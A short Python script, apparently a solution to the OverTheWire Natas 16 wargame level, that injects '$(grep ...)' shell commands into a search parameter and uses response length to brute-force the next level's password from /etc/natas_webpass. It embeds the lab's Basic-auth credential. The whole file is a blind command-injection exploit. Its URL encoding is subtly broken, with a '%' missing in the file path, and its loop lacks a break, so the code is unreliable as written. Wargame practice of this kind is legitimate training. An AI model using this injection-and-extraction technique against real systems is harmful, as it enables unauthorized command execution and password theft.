#!/usr/bin/python

import requests
from requests.auth import HTTPBasicAuth

all = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
j = ''
print(' Finding the password...')

while len(j) < 32:
    for i in all:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+^' + j + i + '+%2Fetc2Fnatas_webpass%2Fnatas17%29&submit=Search', auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        if len(r.content) < 461983:
            j += i
print('Password for natas17 is ', j)
